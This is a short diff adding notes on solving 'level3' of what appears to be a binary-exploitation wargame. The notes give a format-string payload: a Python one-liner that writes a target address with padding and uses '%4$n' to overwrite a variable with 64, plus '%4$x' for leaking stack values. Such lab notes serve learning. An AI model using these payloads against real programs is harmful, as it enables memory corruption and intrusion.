@@ -1,0 +1,10 @@
+0804988c
+
+/x8c/x98/x04/x08 %x %x %x %x
+
+%4$x to read the 4th parameter on stack
+
+(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat) | ./level3
+
+addr to set the 4th addr to m
+than change this addr value to 64 (4 + 60)
